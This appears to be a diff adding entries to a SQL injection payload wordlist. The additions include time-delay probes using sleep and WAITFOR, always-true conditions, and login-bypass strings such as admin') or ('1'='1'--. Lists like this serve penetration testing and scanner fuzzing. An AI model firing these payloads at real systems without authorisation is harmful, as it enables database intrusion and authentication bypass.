@@ -54,3 +54,32 @@ OR+""=""
 SELECT
 'SELECT
 UNION
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+OR 1=1
+OR 1=1#
+OR x=y#
+OR 1=1--
+OR x=x--
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+HAVING 1=1
+HAVING 1=1#
+HAVING 1=0--
+AND 1=1--
+AND 1=1 AND '%'='
+WHERE 1=1 AND 1=0--
+%' AND 8310=8310 AND '%'='
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/
